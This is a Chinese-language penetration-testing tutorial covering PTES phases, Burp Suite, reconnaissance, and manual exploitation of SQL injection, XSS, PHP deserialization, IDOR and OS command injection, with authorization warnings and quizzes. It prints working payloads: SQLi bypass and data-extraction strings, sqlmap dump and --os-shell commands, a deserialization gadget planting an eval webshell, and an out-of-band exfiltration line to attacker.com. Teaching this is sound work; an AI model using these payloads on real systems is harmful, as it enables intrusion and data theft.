滲透測試方法論

滲透測試不是隨意使用工具掃一遍，而是有系統性的流程。主流的方法論框架為每個階段提供清晰指引，確保測試全面且可重現。

PTES（滲透測試執行標準）

01
前期溝通（Pre-engagement）
與客戶確認測試範圍（IP/域名/功能模塊）、時間窗口、測試類型（黑盒/白盒/灰盒）、緊急聯繫人、法律文件（SOW/NDA）簽署
02
情報收集（Intelligence Gathering）
被動偵察（WHOIS、Google Hacking、LinkedIn、Shodan）和主動偵察（端口掃描、子域名枚舉、目錄掃描），目標：畫出完整的攻擊面地圖
03
威脅建模（Threat Modeling）
根據收集的信息，分析最可能的攻擊入口和高價值目標，制定詳細的測試計劃和優先順序
04
漏洞分析（Vulnerability Analysis）
使用掃描工具（Nessus/Nikto/Nuclei）和手工測試發現漏洞，驗證誤報，評估漏洞的實際影響
05
漏洞利用（Exploitation）
使用工具或手工方式利用已確認的漏洞，獲取 Shell 或敏感數據，核心原則：保留充分證據截圖
06
後滲透（Post-Exploitation）
在授權範圍內進行提權、橫向移動、持久化，演示漏洞的最大業務影響（如能否接觸到客戶隱私數據、財務系統等）
07
報告撰寫（Reporting）
撰寫清晰、可操作的測試報告。分管理摘要（給高管看）和技術細節（給開發/運維看），包含每個漏洞的風險評級、复現步驟、修復建議

測試類型

黑盒測試 Black-box
測試者對目標系統一無所知，完全模擬外部攻擊者視角。最接近真實攻擊場景，但耗時最長、覆蓋面可能不全面。
白盒測試 White-box
測試者獲得完整的系統信息（架構圖、源碼、帳號）。覆蓋最全面，效率最高，常用於安全開發生命週期（SDLC）中的代碼審計。
灰盒測試 Grey-box
介於兩者之間。測試者獲得部分信息（如低權限帳號、API 文檔）。是實際項目中最常見的模式，平衡了效率和真實性。
紅隊演練 Red Team
長時間（數週至數月）、全面的模擬 APT 攻擊，包含社工釣魚、物理入侵等。目標是測試組織整體防禦和應急能力，而非找出所有漏洞。
永遠記住

無論多麼高超的技術，沒有書面授權協議，任何滲透測試都是犯罪。Stage 4 學習的所有技術，只能在以下場景使用：
① 您自己搭建的靶機（Vulhub/DVWA/HTB）
② 已取得 SOW 授權的委託項目
③ 官方 SRC / BUG BOUNTY 平台的授權範圍

Burp Suite：Web 滲透測試瑞士軍刀

Burp Suite 是 Web 滲透測試中最重要的工具，沒有之一。幾乎所有 Web 漏洞的測試都需要用到它。必須達到熟練操作的水準。

核心模組一覽

Proxy（代理）
核心模組
攔截和修改瀏覽器與服務器之間的所有 HTTP/HTTPS 請求。所有 Web 漏洞測試的起點，必須掌握。
Repeater（重發器）
核心模組
手動修改並重複發送 HTTP 請求，觀察不同輸入對響應的影響。手工測試 SQL 注入、XSS、越權的主要工具。
Intruder（爆破器）
核心模組
自動化的 Payload 投放工具，可進行暴力破解、參數枚舉、模糊測試。注意：Community 版限速，建議用 ffuf 替代。
Scanner（掃描）
Pro 版功能
自動掃描 Web 漏洞，Pro 版功能強大，可發現 SQLi、XSS 等常見漏洞。Community 版不含此模組。
Decoder（解碼）
輔助工具
快速進行 URL 編碼/解碼、Base64、HTML 實體、十六進制等各種編碼轉換。WAF 繞過時常用。
Logger（日誌）
輔助工具
記錄所有 HTTP 流量，可搜尋和過濾。做測試報告時用於回溯每個請求的細節。

情報收集：資產發現與子域名枚舉

「知己知彼，百戰不殆」。情報收集（Recon）是決定滲透測試能否成功的第一步。許多成功的滲透攻擊都源於在前期發現了一個被遺忘的測試子域名或過時系統。

被動偵察（OSINT）

01
WHOIS / 域名信息 — 獲取域名注册人、郵件、地址、域名伺服器。工具：whois example.com、站長工具
02
Google Hacking（Google Dork） — 利用 Google 高級搜索語法（如 site:target.com filetype:pdf、inurl:admin）發現洩露的文件和敏感頁面
03
Shodan / FOFA / Censys — 網路空間搜尋引擎，可搜索暴露在公網的服務、設備和已知漏洞。org:"Target Corp" 可找出所有屬於目標的 IP
04
SecurityTrails / Wayback Machine — 查看歷史 DNS 記錄（可能洩露真實 IP）和歷史網頁快照（可能包含已刪除的敏感內容）
05
GitHub / GitLab 代碼洩露 — 搜索 target.com password、target.com api_key 等，開發者不小心上傳的配置文件可能包含資料庫密碼、API Key 等

情報收集的黃金原則

情報收集做得越充分，後面的漏洞挖掘越高效。花 30% 的時間在情報收集上，可以節省 70% 的測試時間。重點關注：被遺忘的測試環境、過時的第三方插件版本、洩露的認證信息、暴露的管理後台。這些往往是最容易突破的入口。

C這不算漏洞，因為 GitHub 是公開平台
DXSS 漏洞，需要注入 JavaScript 來利用
正確！這是典型的「代碼倉庫敏感信息洩露」，屬於 OWASP Top 10 A02（加密機制失效/敏感數據洩露）。開發者不小心將含有數據庫密碼的配置文件（如 .env、config.php、application.yml）提交到公開倉庫。正確處理：立即在 GitHub 的 Security Advisories 中報告，並建議客戶立即更換密碼（即使刪除文件，git 歷史記錄中仍可找到）。

SQL 注入原理與手工測試

SQL 注入（SQL Injection）是 Web 安全中持續時間最長、危害最廣的漏洞類型。理解手工注入的原理，才能在面對 WAF 或特殊環境時不依賴工具。

尋找注入點

任何將用戶輸入傳遞給後端資料庫的地方都是潛在注入點：URL 參數（GET）、表單（POST）、HTTP Header（User-Agent/Cookie/X-Forwarded-For）、搜索框、排序參數等。

SQL 注入 — 判斷是否存在注入點
-- ─── 步驟1：判斷是否存在注入 ───
-- 原始請求：https://target.com/item.php?id=1

-- 加單引號，觀察是否報錯
https://target.com/item.php?id=1'
-- 報錯（You have an error in your SQL syntax）→ 存在注入，且有報錯回顯

-- 數字型注入判斷（and 1=1 vs and 1=2）
https://target.com/item.php?id=1 and 1=1   -- 頁面正常
https://target.com/item.php?id=1 and 1=2   -- 頁面異常/無內容 → 存在注入

-- 字串型注入判斷
https://target.com/search.php?q=test'         -- 報錯
https://target.com/search.php?q=test'--       -- 正常 → 存在注入

-- ─── 步驟2：判斷欄位數（ORDER BY 試探法）───
id=1 ORDER BY 1--    -- 正常
id=1 ORDER BY 2--    -- 正常
id=1 ORDER BY 3--    -- 正常
id=1 ORDER BY 4--    -- 報錯 → 查詢有 3 個欄位

-- ─── 步驟3：找到顯示位（回顯位）───
id=-1 UNION SELECT 1,2,3--
-- 頁面顯示出 "2" → 顯示位是第2個欄位

admin'--
admin'#
admin' OR 1=1--
admin' OR '1'='1

--          -- MySQL / MSSQL（注意後面有空格）

僅限授權環境

以上所有 Payload 僅可在您的本地靶機（DVWA/Vulhub）或已取得書面授權的測試環境中使用。對任何未授權系統測試 SQL 注入是違法行為。

聯合查詢注入 / 報錯注入

UNION 聯合查詢注入 — 完整流程
-- 已知：查詢有 3 個欄位，顯示位在第 2、3 個欄位

-- 步驟1：獲取當前資料庫名
id=-1 UNION SELECT 1,database(),3--
-- 頁面顯示：dvwa（當前資料庫名）

-- 步驟2：獲取所有資料表名
id=-1 UNION SELECT 1,group_concat(table_name),3
FROM information_schema.tables
WHERE table_schema=database()--
-- 頁面顯示：guestbook,users

-- 步驟3：獲取 users 表的所有欄位名
id=-1 UNION SELECT 1,group_concat(column_name),3
FROM information_schema.columns
WHERE table_name='users'--
-- 頁面顯示：user_id,first_name,last_name,user,password,avatar

-- 步驟4：提取數據（帳號+密碼）
id=-1 UNION SELECT 1,group_concat(user,'~',password SEPARATOR '\n'),3
FROM users--
-- 頁面顯示：admin~5f4dcc3b5aa765d61d8327deb882cf99（MD5 hash）

-- 步驟5：Crack 密碼 Hash
-- 使用 john、hashcat 或 crackstation.net 在線破解
報錯注入（Error-based Injection）
-- 適用場景：頁面顯示 SQL 錯誤信息，但沒有正常的顯示位

-- extractvalue 報錯注入（MySQL 5.1+）
id=1 AND extractvalue(1,concat(0x7e,database()))--
-- 錯誤信息：XPATH syntax error: '~dvwa'  ← 資料庫名在波浪號後面！

-- updatexml 報錯注入
id=1 AND updatexml(1,concat(0x7e,user()),1)--
-- 錯誤信息：XPATH syntax error: '~root@localhost'

-- 報錯注入獲取所有表名
id=1 AND extractvalue(1,concat(0x7e,
  (SELECT group_concat(table_name) FROM information_schema.tables
   WHERE table_schema=database())))--
-- 注意：extractvalue 每次最多顯示 32 個字元，超出需要用 SUBSTR 分段獲取

布林盲注 / 時間盲注

當頁面沒有任何 SQL 回顯，也沒有報錯信息時，就需要使用「盲注」技術。盲注相當於在黑暗中與資料庫對話，通過「是/否」的響應差異逐步提取數據。

布林盲注 — 手工逐字元提取
-- 場景：注入點存在，但頁面只顯示"存在"或"不存在"，無其他信息

-- ─── 步驟1：確認布林盲注存在 ───
id=1 AND 1=1--    -- 頁面顯示"存在" → 真
id=1 AND 1=2--    -- 頁面顯示"不存在" → 假
-- 兩個響應不同 → 布林盲注確認

-- ─── 步驟2：猜測資料庫名長度 ───
id=1 AND length(database())=4--   -- 如果為真，資料庫名長度是4

-- ─── 步驟3：逐字元猜測資料庫名 ───
id=1 AND substr(database(),1,1)='d'--  -- 第1個字是 'd'？
id=1 AND substr(database(),2,1)='v'--  -- 第2個字是 'v'？
id=1 AND substr(database(),3,1)='w'--  -- 第3個字是 'w'？
id=1 AND substr(database(),4,1)='a'--  -- 第4個字是 'a'？→ 資料庫名：dvwa

-- 使用 ASCII 數值比較（更精確，可二分搜索加速）
id=1 AND ascii(substr(database(),1,1))>100--
id=1 AND ascii(substr(database(),1,1))>110--
id=1 AND ascii(substr(database(),1,1))=100--  -- 100=d
時間盲注 — SLEEP 函數判斷
-- 場景：頁面無論真假都顯示相同內容，但可觀察響應時間差異

-- 確認時間盲注存在（如果延遲 5 秒，注入存在）
id=1 AND sleep(5)--
id=1 AND if(1=1,sleep(5),0)--

-- 逐字元提取（True → 延遲 5 秒，False → 立即響應）
id=1 AND if(substr(database(),1,1)='d',sleep(5),0)--

-- 完整提取資料庫名（每個字元測試）
id=1 AND if(ascii(substr(database(),1,1))=100,sleep(3),0)--
-- 延遲 3 秒 → 第1個字元 ASCII=100='d'

-- ─── 時間盲注的實際效率問題 ───
-- 手工時間盲注極慢（提取10個字元=至少50次請求）
-- 實際使用 sqlmap --technique=T 自動化處理

sqlmap 自動化利用與繞過技巧

sqlmap 是業界標準的 SQL 注入自動化工具，能自動完成注入點檢測、數據提取、甚至 GetShell 的全流程。但理解它背後的原理（上面三節）才能在 WAF 或特殊場景下靈活調整。

sqlmap — 常用命令大全
# ─── 基本使用 ───
# 測試 GET 參數
sqlmap -u "http://target.com/item.php?id=1" --dbs

# 測試 POST 表單（先用 Burp 保存請求為文件）
sqlmap -r request.txt --dbs

# ─── 逐步提取數據 ───
sqlmap -u "http://target.com/?id=1" --dbs          # 獲取所有資料庫
sqlmap -u "http://target.com/?id=1" -D mydb --tables   # 獲取 mydb 的所有表
sqlmap -u "http://target.com/?id=1" -D mydb -T users --columns  # 獲取欄位
sqlmap -u "http://target.com/?id=1" -D mydb -T users -C user,password --dump  # 導出數據

# ─── 常用參數 ───
--level=5          # 測試深度（1-5，默認1），越高越全面但越慢
--risk=3           # 風險等級（1-3），3 包含 UPDATE 等高風險注入
--dbms=mysql       # 指定資料庫類型（加快速度）
--technique=BEUST  # 限定注入技術：B布林 E報錯 U聯合 S堆疊 T時間
--batch            # 全自動，不問確認（-y）
--threads=10       # 並發線程數（加快速度）
--os-shell         # 嘗試獲取操作系統 Shell（需要高權限）

# ─── WAF 繞過技巧 ───
--tamper=space2comment    # 用 /**/ 替換空格
--tamper=randomcase       # 隨機大小寫（SeLeCt）

小測驗
在測試一個 SQL 注入點時，你發現輸入 1 AND 1=1-- 時頁面顯示商品，輸入 1 AND 1=2-- 時頁面為空，但頁面上看不到任何報錯信息，也沒有顯示查詢結果的位置。這是哪種注入類型？
A聯合查詢注入（UNION）
B報錯注入（Error-based）
C布林盲注（Boolean-based Blind）

正確！「有響應差異（一個顯示內容，一個不顯示），但沒有直接回顯查詢結果或報錯信息」是布林盲注的典型特徵。聯合查詢注入需要有顯示位；報錯注入需要頁面顯示 SQL 錯誤；時間盲注則是真假響應在頁面內容上完全一致，只能通過延遲時間來判斷。

XSS 三大類型與利用原理

XSS（Cross-Site Scripting）跨站腳本攻擊，讓攻擊者在受害者的瀏覽器中執行惡意 JavaScript。注意：XSS 攻擊的是用戶，而非伺服器。

反射型 XSS（Reflected）
惡意腳本包含在 URL 中，伺服器將輸入反射回響應頁面但不存儲。攻擊者需誘使受害者點擊含惡意 URL 的連結。常見於搜索框、錯誤頁面。
?search=<script>alert(1)</script>
存儲型 XSS（Stored）
惡意腳本被持久化存儲到資料庫中，所有訪問該頁面的用戶都受影響。危害最大。常見於留言板、評論區、個人簡介等。
DOM 型 XSS
漏洞在客戶端 JavaScript 代碼中，通過修改頁面 DOM 觸發，請求不一定到達伺服器。需要審計 JS 代碼中的危險 sink（如 innerHTML、document.write）。
XSS 主要利用方向
① Cookie 竊取 / Session 劫持
② 釣魚頁面（偽造登入框）
③ 鍵盤記錄
④ 截圖（通過 Canvas API）
⑤ 控制受害者瀏覽器（BeEF）

反序列化漏洞原理與利用

反序列化漏洞是近年來危害最大的漏洞類型之一，Log4Shell（CVE-2021-44228）、Shiro 反序列化、Java 各大框架的 RCE 漏洞均屬此類。

PHP 反序列化漏洞原理
<?php
// ─── 漏洞代碼示例 ───
class FileManager {
    public $logfile;
    public $data;

    // __destruct 在對象銷毀時自動觸發
    function __destruct() {
        file_put_contents($this->logfile, $this->data);
        // 如果 logfile=webshell.php，data=<?php eval($_POST['c']); ?>
        // 就可以在伺服器上寫入一個 Webshell！
    }
}

// ─── 危險的反序列化操作 ───
$data = $_GET['data']; // 直接接收用戶輸入
unserialize($data);   // 反序列化→觸發 __destruct→寫入 Webshell！

// ─── 攻擊者構造的惡意序列化數據 ───
$obj  = new FileManager();
$obj->logfile = "/var/www/html/webshell.php";
$obj->data    = '<?php eval($_POST["c"]); ?>';
echo serialize($obj);
// 輸出：O:11:"FileManager":2:{s:7:"logfile";s:27:"/var/www/html/webshell.php";...}
?>

業務邏輯漏洞

業務邏輯漏洞是指攻擊者利用應用程序正常功能中的設計缺陷，以非預期的方式使用系統。這類漏洞掃描器無法自動發現，需要深入理解業務流程。

01
支付漏洞 — 修改訂單中的商品價格（如 0.01 元購買高價商品）、負數金額、並發下單刷庫存、使用已使用的優惠券
02
驗證碼繞過 — 驗證碼不過期（可重複使用同一個）、驗證碼在響應中回顯、暴力破解 4/6 位純數字驗證碼
03
密碼重置漏洞 — 重置 Token 可預測（如用戶 ID + 時間戳）、重置鏈接永不過期、Host 頭注入劫持重置郵件、短信驗證碼爆破
04
接口未鑒權 — 前端隱藏的接口未做後端驗證（如 /api/admin/users 普通用戶可直接訪問）、未登入可訪問需登入的頁面
05
批量操作漏洞 — 無速率限制的接口，可批量枚舉手機號、批量查詢用戶信息、批量嘗試密碼（一種分布式的密碼噴射攻擊）

越權漏洞（水平越權 / 垂直越權）

越權漏洞測試方法
# ─── 水平越權（IDOR）測試 ───
# 場景：用戶 A 的訂單 URL 為 /order?id=1001
# 嘗試訪問 /order?id=1002（用戶 B 的訂單）

# 常見的 IDOR 參數
?id=123          → 改為 ?id=122
?user_id=456     → 改為 ?user_id=457
?file=my_doc.pdf → 改為 ?file=admin_doc.pdf
?token=abc123    → 嘗試其他 token（如果 token 可預測）

# ─── 垂直越權測試 ───
# 場景：普通用戶嘗試調用管理員功能
# 方法1：在 Burp Suite 中記錄管理員的請求
# 方法2：替換 Session Cookie 為普通用戶的，重放管理員請求
# 如果普通用戶能成功調用管理員 API → 垂直越權確認

# ─── 批量化測試 IDOR（Burp Intruder）───
# 將 id 參數標記為 Payload 位置
# 使用 Number List（1000-2000）進行枚舉
# 根據響應長度/狀態碼篩選有效 ID
小測驗
用戶 A（id=100）訪問自己的個人資料 API：GET /api/profile/100，然後嘗試訪問 GET /api/profile/101，成功看到了用戶 B 的個人資料。這是什麼漏洞？
A垂直越權（普通用戶執行管理員功能）
B水平越權 / IDOR（Insecure Direct Object Reference，不安全的直接物件引用）
CSQL 注入（通過 id 參數注入）
DCSRF（跨站請求偽造）
正確！這是「水平越權」或稱 IDOR（Insecure Direct Object Reference）。水平越權指同等權限的不同用戶之間互相訪問對方的資源（用戶 A 訪問用戶 B 的數據）。垂直越權指低權限用戶訪問高權限用戶的功能（普通用戶調用管理員 API）。OWASP Top 10 A01（存取控制失效）中，IDOR 是最常見的子類型。

OS 命令注入（RCE）

命令注入漏洞允許攻擊者在伺服器上執行任意系統命令，是危害最嚴重的 Web 漏洞之一，通常可直接導致伺服器完全被控制。

命令注入 — 利用與提升

|| whoami         # OR：前面失敗才執行 whoami
| whoami          # PIPE：將前一個命令的輸出傳給 whoami

$(whoami)         # 命令替換：同反引號
%0awhoami         # 換行符（URL 編碼）

# ─── 確認命令注入（無回顯場景：時間盲注）───

# ─── 無回顯 → 帶外獲取結果 ───
# 在 attacker.com 上啟動 tcpdump 或 BurpCollaborator

; ping -c 1 $(whoami).attacker.com

# ─── 反彈 Shell（getShell 的核心操作）───
# 攻擊者先監聽：nc -lvnp 4444

Webshell 管理：蟻劍 / 冰蠍 / 哥斯拉

哥斯拉（Godzilla）
新一代加密 Webshell 管理工具，支持多種加密方式（XOR/AES），插件豐富，可實現流量完全加密，規避檢測能力最強。

PHP 源碼審計方法與實戰

源碼審計（Code Review）是從開發者角度發現安全漏洞，是白盒測試的核心技能。掌握源碼審計能找到掃描器和黑盒測試無法發現的深層漏洞。

源碼審計方法論

STEP1
通讀框架結構
了解框架目錄結構、路由機制、中間件，尋找入口文件（index.php）和核心配置文件（config.php）
STEP2
追蹤危險函數
全局搜索危險函數（eval/system/exec/include/unserialize/mysql_query 等），逆向追蹤參數來源，判斷是否可控且未過濾
STEP3
檢查輸入點過濾
審查所有超全局變數（$_GET/$_POST/$_REQUEST）的處理邏輯，有無遺漏的過濾點
STEP4
業務邏輯分析
審查認證、授權、支付等業務邏輯代碼，尋找條件競爭、繞過邏輯等問題
源碼審計 — 快速發現漏洞的搜索技巧
# ─── 在源碼目錄中搜索危險模式 ───

# 搜索所有 eval 使用（潛在代碼執行）
grep -r "eval(" . --include="*.php" -l

# 搜索所有 SQL 字串拼接（潛在 SQL 注入）
grep -r "WHERE.*\$" . --include="*.php" | grep -v "prepare\|bindParam"

# 搜索所有文件包含（潛在 LFI）
grep -r "include\|require" . --include="*.php" | grep "\$"

# 搜索所有反序列化（潛在反序列化漏洞）
grep -r "unserialize" . --include="*.php"

# 搜索所有系統命令執行
grep -r "system\|exec\|passthru\|shell_exec\|popen" . --include="*.php" | grep "\$"

# ─── RIPS / phpcs 自動化掃描 ───
# RIPS：商業 PHP 靜態代碼分析工具
# phpcs：PHP Code Sniffer，可配置安全規則集
phpcs --standard=Security /var/www/html/ -v

01

02

03

05
附錄 — 完整的命令輸出、Burp 截圖、Nmap 掃描結果等原始數據
